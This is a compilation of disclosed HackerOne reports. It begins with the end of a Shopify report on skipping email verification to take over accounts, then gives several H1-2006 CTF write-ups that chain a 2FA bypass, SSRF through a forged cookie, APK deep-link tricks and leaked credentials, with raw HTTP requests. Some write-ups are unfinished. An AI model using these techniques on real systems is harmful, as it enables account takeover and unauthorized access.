- **Weakness:** Uncategorized
- **Program:** Shopify
- **Reporter:** @imgnotfound
- **Bounty:** - usd
- **Disclosed:** 2020-09-02T14:47:24.963Z
- **CVE(s):** -

**Vulnerability Information:**

## Details
The https://pos-channel.shopifycloud.com/graphql-proxy/admin can be exploited to update a staff member email without any email confirmation. 

Using the partner dashboard, we've the ability to create a store that doesn't have a Shopify ID account on https://accounts.shopify.com. By using these two together, all we have to do is create an arbitrary store to an email that we own and confirm it with received email, then use the the POS Staff endpoint to update our email without having to validate it.

You'll then be prompted to create a Shopify ID for your stores (the new created one alongs with the victim stores) and you won't need to validate that you own the email since it is already verified.

## Steps to reproduce
1. Have a victim with a shop that doesn't have a Shopify ID
1. Open https://parners.shopify.com and create a development store
1. Within the store creation form, you'll need to update your shop email to one that doesn't exist within Shopify and that you own (so it can be validated). As the field is read-only, that can either be done by intercepting the request with an application like Burp or do the above **within your browser console** to update the form object.
```
window.RailsData.current_organization.business_email = "nonexistingemail@shopify.com";
window.RailsData.user.email = "nonexistingemail@shopify.com";
```
1.. Validate that you own the email address (Link sent to your email)
1. Add the **POS** to your shop **Sales Channels**
1. Open up the **POS > Staff**
1. Save your own staff page and copy the CURL request by using browser inspection
1. Replace the CURL payload email field with the victim email and send the request
1. Refresh your profile page in your Shop, you'll then be prompt to combine your account and note that you're not asked to validated the new email (victim's one).
1. Proceed with the Shopify ID creation
1. You now own the Shopify ID, you can just change its email to yours as the victim could still be recovering them by doing a forget password.

## Impact

That vulnerability has multiple impacts so I wasn't sure if I should've been creating multiple reports
1. Ability to take-over some account
{F818496}

1. Ability to create a verified Shopify ID with non-verified email (See the verified: **francisbeaudoin@hackerone.com**)
{F818494}

1. Ability to update Staff informations even when linked to a Shopify ID

For the later one, let's say you have a Shop with two staff members: A and B (the attacker). Staff B is aware that the Shop owner is about to transfer the Shop to Staff A. By exploiting the POS access endpoint, staff B would be able to move **first name, last name and email** between Staff A <--> Staff B so that once the shop owner would be selecting the right Staff within the UI, we would be sending it to the wrong person.

**Summary (team):**

A report from @francisbeaudoin showed that it was possible to bypass Shopify's email verification for a small subset of Shopify user accounts. Doing so would have allowed a user to access accounts they did not own. 

Our team immediately deployed a change to address this issue. Additionally, we have removed the ability to verify an email address prior to merging an account. All account merges now require an email verification flow.

---

### [@shakedko H1-2006 CTF writeup](https://hackerone.com/reports/894623)

- **Report ID:** `894623`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** h1-ctf
- **Reporter:** @shakedko
- **Bounty:** - usd
- **Disclosed:** 2020-07-06T16:02:31.016Z
- **CVE(s):** -

**Vulnerability Information:**

## TL;DR

Flag is: `^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$`.

Thank you for this awesome challenge! 

## Introduction

I have participated in this CTF as I wanted to see how far I'd be able to get considering the fact that I'm doing bug bounty for a relatively short time. 

Coming from the software engineering world, I wanted to see how I'd be able to implement my thinking process and figure out as much as I can by myself.

## Tools 

I have used several tools during this process. You may find these tools in the following links:

- [ffuf](https://github.com/ffuf/ffuf) for fuzzing.
- Word lists mainly from [SecLists] (https://github.com/danielmiessler/SecLists/). 
- [dex2jar](https://github.com/pxb1988/dex2jar)
- [JD-GUI](http://java-decompiler.github.io/)
- Android Studio
- ngrok 
- [findomain](https://github.com/Edu4rdSHL/findomain)

## Description 

HackerOne has [tweeted](https://twitter.com/Hacker0x01/status/1266454022124376064/photo/1) about the mentioned CTF on its Twitter account, describing what would be the end result once the CTF is done: 

> We need your help! CEO 
@martenmickos
 needs to approve May bug bounty payments but he has lost his login details for BountyPay. Can you help retrieve them or make the payments for us? https://hackerone.com/h1-ctf 

This meant that until there wasn't a place to make a payment, the CTF wasn't over. This kept me on track as every time I finished a step,as  I knew that I was on the right track but there was still something to be found. 

## Steps


- Reconnaissance (Subdomain Enumration, Understanding the Application, Content Discovery)
- Open Redirect
- Information Disclosure (Log File)
- Improper Authorization
- SSRF
- Information Disclosure (Directory Listing, In-house APK)
- Reverse Enginerring (APK)
- Information Disclosure (Twitter Account)
- Authentication Bypass (Creating Sandra's user)
- CSRF
- Parameter Pollution
- Privilege Escalation via CSRF
- Information Disclosure (CEO username & password)
- SSRF
- CSS Keylogger via SSRF

### Step 1 - Reconnaissance 

#### Subdomain Enumartion

The scope `*.bountypay.h1ctf.com`, mentioned at https://hackerone.com/h1-ctf, made it clear that there are subdomains to be found, therefore the first thing I did was running a subdomain enumoration:

```
$ findomain -t bountypay.h1ctf.com

Target ==> bountypay.h1ctf.com

Searching in the Facebook API... 🔍
Searching in the Bufferover API... 🔍
Searching in the Threatminer API... 🔍
Searching in the AnubisDB API... 🔍
Searching in the CertSpotter API... 🔍
Searching in the Urlscan.io API... 🔍
Searching in the Threatcrowd API... 🔍
Searching in the Crtsh database API... 🔍
Searching in the Virustotal API... 🔍
Searching in the Sublist3r API... 🔍
Searching in the Spyse API... 🔍

staff.bountypay.h1ctf.com
software.bountypay.h1ctf.com
api.bountypay.h1ctf.com
app.bountypay.h1ctf.com
www.bountypay.h1ctf.com
bountypay.h1ctf.com

A total of 6 subdomains were found for domain bountypay.h1ctf.com 👽 in 2 seconds.⏲️

Good luck Hax0r 💀!
```

#### Understanding the Application 

I hit all the domains, learnt how and what existed, including texts, descriptions, assets such as js and css and so on. Once done, I continued with my recon by fuzzing `app.bountypay.h1ctf.com`.  

#### Content Discovery

After learning about the application and figuring which subdomains were available, I started to search for directories and files. This process gave me some fruits for later on, including: 

- GET https://app.bountypay.h1ctf.com/cgit 
- GET https://app.bountypay.h1ctf.com/.git
- GET https://api.bountypay.h1ctf.com/api
- GET https://api.bountypay.h1ctf.com/api/staff
- GET https://api.bountypay.h1ctf.com//api/accounts/<word>

### Step 2 - Open Redirect

While doing my recon, I saw that https://api.bountypay.h1ctf.com as an open redirect on the main page: https://api.bountypay.h1ctf.com/redirect?url=... I knew that this would be useful later on so I kept it in my notes and moved to the next thing I found during my recon

#### Step 3 - Information Disclosure (Log File)

Scanning the `cgit` directory mentioned above, under the content discovery recon, I found information disclosure exposing a .git repository: 

```
cat httpsapp.bountypay.h1ctf.com-cgit-FUZZ.fuzz.json | jq '.results[]'
{
  "input": {
    "FUZZ": "config"
  },
  "position": 97,
  "status": 200,
  "length": 278,
  "words": 19,
  "lines": 12,
  "redirectlocation": "",
  "url": "https://app.bountypay.h1ctf.com/cgit/config"
}
{
  "input": {
    "FUZZ": "index"
  },
  "position": 20,
  "status": 200,
  "length": 0,
  "words": 1,
  "lines": 1,
  "redirectlocation": "",
  "url": "https://app.bountypay.h1ctf.com/cgit/index"
}
{
  "input": {
    "FUZZ": "description"
  },
  "position": 3838,
  "status": 200,
  "length": 73,
  "words": 10,
  "lines": 2,
  "redirectlocation": "",
  "url": "https://app.bountypay.h1ctf.com/cgit/description"
}
```

Looking into these files, I have found  https://app.bountypay.h1ctf.com/cgit/config exposed a github repository: https://github.com/bounty-pay-code/request-logger.git which contained one file [logger.php]() that showed me the way to the next step: 

```
<?php

$data = array(
  'IP'        =>  $_SERVER["REMOTE_ADDR"],
  'URI'       =>  $_SERVER["REQUEST_URI"],
  'METHOD'    =>  $_SERVER["REQUEST_METHOD"],
  'PARAMS'    =>  array(
      'GET'   =>  $_GET,
      'POST'  =>  $_POST
  )
);

file_put_contents('bp_web_trace.log', date("U").':'.base64_encode(json_encode($data))."\n",FILE_APPEND   );
````

[https://app.bountypay.h1ctf.com/bp_web_trace.log](bp_web_trace.log) log file contained the following base64 decoded strings: 

```
1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==
```

Encoding these strings resulted with the username, password, a hint about a 2FA challenge and a possible action within the app: 

```
{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==
```

### Step 4 - Improper Authorization

Once I tried to login with the credentials that I found, aka `username: brian.oliver`, `password: V7h0inzX`, I saw a 2FA. 

Looking into the input fields in the HTML, I saw that the challenge and the challenge's answer were sent together within the same request. I had it clear that the challenge was hashed with md5, so I tried to use my own hash by using `md5 -s 1` which resulted with `c4ca4238a0b923820dcc509a6f75849b` and then I just used `1` in order to login, and it worked. The request looked like this:

```
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Content-Length: 101
Content-Type: application/x-www-form-urlencoded

username=brian.oliver&password=V7h0inzX&challenge=c4ca4238a0b923820dcc509a6f75849b&challenge_answer=1
```

and the response: 

```
HTTP/1.1 302 Found
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 09 Jun 2020 16:14:12 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Set-Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9; expires=Thu, 09-Jul-2020 16:14:12 GMT; Max-Age=2592000
Location: /
Content-Length: 0
```

Using this new cookie, I was logged in as Brian Oliver.

### Step 5 - SSRF

After I bypassed the application's 2FA using Brain Oliver's credentials, I tried to play with the application's feature. The application had only one available feature which was suppose to show me the payment statements of the company, but trying to fetch this data resulted with nothing new. 

I looked into the request and I saw that it was doing the following request: 

```
GET /statements?month=01&year=2020 HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
X-Requested-With: XMLHttpRequest
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://app.bountypay.h1ctf.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,he;q=0.8
Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9

```

While returning the following response:

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 09 Jun 2020 16:17:38 GMT
Content-Type: application/json
Connection: close
Content-Length: 177

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK\/statements?month=01&year=2020","data":"{\"description\":\"Transactions for 2020-01\",\"transactions\":[]}"}
```

At that point I also looked at the token cookie, which I got when I bypassed the 2FA. Once I decoded its base64, I figured that I might be able to change the request by using the cookie. 

The cookie: `eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9` 
Decoded: `{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}` 

Considering the fact that the `account_id` was available in both the cookie and the response from the request above, I tried to change it and see how it reacted. This is the point where I was finally able to use the open redirect that I have found on stage 2. 

I created a new cookie: `{"account_id":"../../redirect?url=FUZZ&","hash":"de235bffd23df6995ad4e0930baac1a2"}` and passed it to ffuf using a script that generated a wordlist and encoded all of the possible words in base64. My wordlist was a mix of two things: 

1. Known words and files
2. Ideas I got while doing recon - one thing I figured during the recon was that the software.bountypay.h1ctf.com was only accessable from within the company's network and if I find an SSRF, together with the open redirect, I would have defintly checked it out. 

Putting everything together, I found a directory listing while fuzzing which leads me to the next step 

### Step 6 - Information Disclosure (Directory Listing, In-house APK)

As mentioned in the previous step, I got a hit while fuzzing through the SSRF by using the open redirect I have found earlier. The final request was as following: 

```
GET /statements?month=01&year=2020 HTTP/1.1
Host: app.bountypay.h1ctf.com
Cookie: token=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS91cGxvYWRzLyYiLCJoYXNoIjoiZGUyMzViZmZkMjNkZjY5OTVhZDRlMDkzMGJhYWMxYTIifQ==

```

and it's response gave me the hint for the next step: 

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 09 Jun 2020 16:27:29 GMT
Content-Type: application/json
Connection: keep-alive
Content-Length: 491

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/..\/..\/redirect?url=https:\/\/software.bountypay.h1ctf.com\/uploads\/&\/statements?month=01&year=2020","data":"<html>\n<head><title>Index of \/uploads\/<\/title><\/head>\n<body bgcolor=\"white\">\n<h1>Index of \/uploads\/<\/h1><hr><pre><a href=\"..\/\">..\/<\/a>\n<a href=\"\/uploads\/BountyPay.apk\">BountyPay.apk<\/a>                                        20-Apr-2020 11:26              4043701\n<\/pre><hr><\/body>\n<\/html>\n"}
```

Looking at the JSON response, we can see that there was an APK file availble in /uploads/BountyPay.apk. Hitting the full URL https://software.bountypay.h1ctf.com/uplodas/ worked even for non authenticated users. 

### Step 7 - Reverse Enginerring (APK)

When I see an APK or a target that has an APK I usually check its content by either unzipping it or disaassmbiling it. 

In this case, I used dex2jar in order to create a .jar file which allowed me to read the code of the APK together with JD-GUI. 

Once I had the code, I ran the APK using Android Studio's "Profile or debug APK". 

There are plenty of hints within the code and the first one I followed was using the deep links. This helped me understand how to load the 3 different Android Activities: 

- one://part
- two://part
- three://part

Each part had a required URI with different parameters that were available in the code. 

In order to move from part one to part two, all I had to do was putting the following URL in the Launch Options: `one://part?start=PartTwoActivity` 

![APK-1 screenshot]

I figured that I needed the `start=PartTwoActivity` together with a username as it was stated in the code: 

```
    if (getIntent() != null && getIntent().getData() != null) {
      String str = getIntent().getData().getQueryParameter("start");
      if (str != null && str.equals("PartTwoActivity") && sharedPreferences.contains("USERNAME")) {
        ...
        startActivity(new Intent((Context)this, PartTwoActivity.class));
      } 
    } 
```

Once I was on the second Activity, I saw in the code that all inputs where invsible:

```
    EditText editText = (EditText)findViewById(2131230834);
    Button button = (Button)findViewById(2131230794);
    TextView textView = (TextView)findViewById(2131231002);
    editText.setVisibility(4);
    button.setVisibility(4);
    textView.setVisibility(4
```

and all I had to do in order to make them visible was figuring out the params within the URL: 

```
      Uri uri = getIntent().getData();
      String str1 = uri.getQueryParameter("two");
      String str2 = uri.getQueryParameter("switch");
      if (str1 != null && str1.equals("light") && str2 != null && str2.equals("on")) {
        editText.setVisibility(0);
        button.setVisibility(0);
        textView.setVisibility(0);
      } 
```

Therefore, the URL was: `two://part?two=light&switch=on`. This resulted with a hash, an input field which asked for a header name. 

![Apk-2 Screenshot]

While doing some recon, I already saw a suspicious base64 code in the 3rd Activity:

```
  byte[] decodedDirectory = Base64.decode("aG9zdA==", 0);
  
  byte[] decodedDirectoryTwo = Base64.decode("WC1Ub2tlbg==", 0);
  
  final String directory = "aG9zdA==";
  
  final String directoryTwo = "WC1Ub2tlbg==";
  
  final String headerDirectory = "header";
````

Decoding both resulted with the following strings: 

```
$ "WC1Ub2tlbg==" | base64 -d
X-Token: 
$ "aG9zdA==" | base64 -d
host
```

Using the `X-Token` header I got to the 3rd Activity, which again had insvisible components: 

```
protected void onCreate(Bundle paramBundle) {
    ...
    final EditText editText = (EditText)findViewById(2131230837);
    final Button button = (Button)findViewById(2131230796);
    editText.setVisibility(4);
    button.setVisibility(4);
    ...
```

Looking into the code, I saw that there was an HTTP rqeuest that was supposed to be fired once everything had been loaded correctly: 

```
    this.childRefThree.addListenerForSingleValueEvent(new ValueEventListener() {
            public void onCancelled(DatabaseError param1DatabaseError) {
              Log.e("TAG", "onCancelled", (Throwable)param1DatabaseError.toException());
            }
            
            public void onDataChange(DataSnapshot param1DataSnapshot) {
              String str = (String)param1DataSnapshot.getValue();
              if (firstParam != null && decodedFirstParam.equals("PartThreeActivity") && secondParam != null && decodedSecondParam.equals("on")) {
                String str1 = thirdParam;
                if (str1 != null) {
                  StringBuilder stringBuilder = new StringBuilder();
                  stringBuilder.append("X-");
                  stringBuilder.append(str);
                  if (str1.equals(stringBuilder.toString())) {
                    editText.setVisibility(0);
                    button.setVisibility(0);
                    PartThreeActivity.this.thread.start();
                  } 
                } 
              } 
            }
          });
    }
```

Using the following URL: `three://part?switch=b24%3D&three=UGFydFRocmVlQWN0aXZpdHk%3D&header=X-Token` I was able to execute this code

![Apk-3 Screenshot]

I got the `HOST` header and the `X-Token` header in Android Studio's Logcat

```
2020-06-09 20:06:37.938 6261-6309/bounty.pay D/HOST IS:: http://api.bountypay.h1ctf.com
2020-06-09 20:06:37.939 6261-6309/bounty.pay D/TOKEN IS:: 8e9998ee3137ca9ade8f372739f062c1
2020-06-09 20:06:37.940 6261-6309/bounty.pay D/HEADER VALUE AND HASH: X-Token: 8e9998ee3137ca9ade8f372739f062c1
```

![Logcat Screenshot]

It's important to note that I didn't really have to open the APK in an emulator, as I could have edited the `user_created.xml` via `adb`. However, I wanted to actually see what I was facing with as it made it much more clear for me. 

The last Activity had helped me to figure that there's more than just a token and a host. There were two more things that will be useful in the next two steps: 

1. There's a POST request to the exposed host, but something is missing. 
2. The twitter handle made me think that I might have missed something while doing my recon, so I got back to it and found that there was a new employe called Sandra.

### Step 8 - Information Disclosure (Twitter Account)

BountyPay's [Twitter account](https://twitter.com/BountypayHQ) [tweeted a welcome message](https://twitter.com/BountypayHQ/status/1258692286256500741) about a new employe. Looking for this employee, I found an interesting string which seemed like an ID: 
https://twitter.com/SandraA76708114/status/1258693001964068864/photo/1

[Sandra's screenshot]

### Step 9 - Authentication Bypass (Creating Sandra's user)

After I saw APK POST request, host, X-Token I went back to my notes, as I remembered that there were few endpoints that I wasn't able to test. 

Clearly, as Sandra was part of the staff, I first tried to hit `https://api.bountypay.h1ctf.com/api/staff` using the X-Token. This gave me an interesting result: 

```
GET /api/staff? HTTP/1.1
Host: api.bountypay.h1ctf.com
X-Token: 8e9998ee3137ca9ade8f372739f062c1

```

Response
```
[{"name":"Sam Jenkins","staff_id":"STF:84DJKEIP38"},{"name":"Brian Oliver","staff_id":"STF:KE624RQ2T9"}]
````

After I saw this, I tried to do the same with the following POST request: 

```
POST /api/staff?firstParam=UGFydFRocmVlQWN0aXZpdHk%3D HTTP/1.1
Host: api.bountypay.h1ctf.com
X-Token: 8e9998ee3137ca9ade8f372739f062c1
Content-Length: 23
Content-Type: application/x-www-form-urlencoded

staff_id=STF:84DJKEIP38
```

But that resutled with the following reponse: 

```
HTTP/1.1 409 Conflict
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 03 Jun 2020 13:15:29 GMT
Content-Type: application/json
Connection: keep-alive
Content-Length: 39

["Staff Member already has an account"]
```

Now I went back to Sandra's id and tried her `staff_id`: 

```
POST /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
X-Token: 8e9998ee3137ca9ade8f372739f062c1
Content-Length: 36
Content-Type: application/x-www-form-urlencoded

staff_id=STF:8FJ3KFISL3&staff_name=1
```

Response:

```
HTTP/1.1 201 Created
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 03 Jun 2020 19:42:33 GMT
Content-Type: application/json
Connection: keep-alive
Content-Length: 110

{"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"}
```

### Step 10 - CSRF

TBD 
### Step 11 - Parameter Pollution
TBD 
### Step 12 - Privilege Escalation via CSRF
TBD 
### Step 13 - Information Disclosure (CEO username & password)
TBD 
### Step 14 - SSRF
TBD 
### Step 15 - CSS Keylogger via SSRF
TBD 


## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]

## Impact

TBD

---

### [[h1-2006 CTF] Multiple vulnerabilities leading to account takeover and two-factor authentication bypass allows to send pending bounty payments](https://hackerone.com/reports/895722)

- **Report ID:** `895722`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** h1-ctf
- **Reporter:** @kapytein
- **Bounty:** - usd
- **Disclosed:** 2020-07-06T16:02:24.238Z
- **CVE(s):** -

**Vulnerability Information:**

Hi,

First things first, the flag of the CTF challenge.

{F863095}

### Write-Up

I've published my write-up at https://kapytein.nl/texts/2020-06-10-h1-2006-ctf-writeup-2cf34abd3ed/, in order to avoid a lengthy report 😅. 

### TL;DR

1) 2FA bypass as we control both values on the comparison. 
2) SSRF to `software.bountypay.h1ctf.com` to discover a BountyPay Android application.
3) Solve Android challenges using deeplinks. Use leaked Authorization token for `api.bountypay.h1ctf.com`.
4) Leaked staff ID on the badge of [Sandra](https://twitter.com/SandraA76708114) allows access to `staff.bountypay.h1ctf.com` via a `POST /api/staff` call on `api.bountypay.h1ctf.com`.
5) Privilege escalation using GET CSRF.
6) 2FA bypass via a CSS injection.

Thank you for organizing this challenge!

## Impact

This allows an attacker to process bounty payments of customers.

---

### [[H1-2006 2020] CTF Writeup](https://hackerone.com/reports/893395)

- **Report ID:** `893395`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** h1-ctf
- **Reporter:** @un5h4d0w
- **Bounty:** - usd
- **Disclosed:** 2020-06-22T16:24:05.622Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

The CTF's objective could be found in the following Twitter post:

{F858468}

As outlined on `https://hackerone.com/h1-ctf`, all subdomains of `bountypay.h1ctf.com` are in scope.

Doing subdomain enumeration revealed the following subdomains:

* api.bountypay.h1ctf.com
* app.bountypay.h1ctf.com
* bountypay.h1ctf.com
* software.bountypay.h1ctf.com
* staff.bountypay.h1ctf.com
* www.bountypay.h1ctf.com

It was possible to chain multiple vulnerabilities, ultimately completing the task of performing a bounty payout from Marten Mickos' account with the following steps:

1. Leaking source code of a logger on `app.bountypay.h1ctf.com` via a `.git` folder pointing to a public GitHub repository and accessing a leftover logfile referenced in the source code that contains Brian Oliver's credentials for `app.bountypay.h1ctf.com`
2. Bypassing 2FA on `app.bountypay.h1ctf.com` and getting full access to Brian Oliver's user account
3. URL injection via cookie value on `app.bountypay.h1ctf.com`, enabling an attacker to issue arbitrary API calls on `api.bountypay.h1ctf.com` with Brian Oliver's privileges
4. Misusing an open redirect on `api.bountypay.h1ctf.com` via cookie injection on `staff.bountypay.h1ctf.com` to download the BountyPay APK
5. Completing the Android challenges and retrieving an API token for `api.bountypay.h1ctf.com`
6. Use the token value in the `X-Token` header to access `/api/staff` on `api.bountypay.h1ctf.com` and create Sandra Allison's user account for `staff.bountypay.h1ctf.com` 
6. Access `staff.bountypay.h1ctf.com` and get admin privileges by reporting a manipulated HTML site to the admins, which triggers an "upgrade to admin" request for Sandra Allison's account when being visited
7. Use the password for Marten Mickos displayed in the "Admin" tab of `staff.bountypay.h1ctf.com` on `app.bountypay.h1ctf.com` to login as Marten Mickos. Bypass the 2FA that protects the payout of bounties on `app.bountypay.h1ctf.com` by using malicious stylesheets to retrieve the 2FA code and complete the payout process  to payout the bounty payments for Marten Mickos


## Steps To Reproduce:

### 1. Source code leak on app.bountypay.h1ctf.com => user credentials

Performing directory enumeration on that subdomain revealed that the server returns status code 403 instead of 404 for every directory with the string `*git` (e.g. `.git`, `cgit`,...). 

Requesting `https://app.bountypay.h1ctf.com/.git/config` returns the following result:

```
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://github.com/bounty-pay-code/request-logger.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
```

Trying to access that repository on github succeeds. The repository contains a single PHP file, `logger.php`:

```
<?php

$data = array(
  'IP'        =>  $_SERVER["REMOTE_ADDR"],
  'URI'       =>  $_SERVER["REQUEST_URI"],
  'METHOD'    =>  $_SERVER["REQUEST_METHOD"],
  'PARAMS'    =>  array(
      'GET'   =>  $_GET,
      'POST'  =>  $_POST
  )
);

file_put_contents('bp_web_trace.log', date("U").':'.base64_encode(json_encode($data))."\n",FILE_APPEND   );
```

Next, I tried to access `/bp_web_trace.log`, which contains the following data:

```
1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==
```

The lines seem to contain a timestamp and base64 encoded data. The decoded data contains a password:

```
{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
```

The credentials `brian.oliver:V7h0inzX` are still valid: When trying to login with them, I did not get the error message `Invalid username / password combination` anymore, but instead I got redirected to a 2FA page.

### 2. Bypassing 2FA on app.bountypay.h1ctf.com => access to user account

The 2FA page shows detailed information about the structure of the 2FA password (parameter `challenge_response`):

{F858471}

The 2FA authentication can be easily bypassed because the challenge can be chosen by the user and equals `md5sum(challenge_answer)`.

Therefore, I simply generated a valid pair of challenge - challenge answer as follows:

```
$ echo -n AAAAAAAAAA | md5sum
16c52c6e8326c071da771e66dc6e9e57  -
```

The following request bypasses the 2FA check for the user `brian.oliver` and completes the login process:

```
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 110

username=brian.oliver&password=V7h0inzX&challenge_answer=AAAAAAAAAA&challenge=16c52c6e8326c071da771e66dc6e9e57
```

### 3. URL injection via cookie value on app.bountypay.h1ctf.com => arbitrary API calls on api.bountypay.h1ctf.com

When analyzing the requests made when using `app.bountypay.h1ctf.com` as user `brian.oliver`, I noticed that the cookie value is not encrypted but only base64 encoded.

A decoded cookie looks like follows:

```
